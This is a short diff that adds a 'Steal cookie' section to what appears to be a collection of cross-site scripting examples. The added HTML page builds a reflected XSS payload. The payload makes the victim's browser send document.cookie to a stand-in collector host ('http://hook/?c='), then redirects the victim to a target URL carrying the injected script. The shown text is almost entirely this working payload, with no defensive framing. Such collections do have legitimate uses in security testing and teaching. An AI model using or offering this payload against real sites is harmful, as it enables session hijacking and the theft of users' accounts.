@@ -24,3 +24,18 @@
   </body>
 </html>
 ```
+
+### Steal cookie
+
+```html
+<html>
+  <body>
+    <script>
+      const payload = encodeURIComponent(
+        '<script>var i=new Image();i.src="http://hook/?c="+encodeURIComponent(document.cookie);<\/script>'
+      );
+      window.location = 'http://target?msg=' + payload;
+    </script>
+  </body>
+</html>
+```
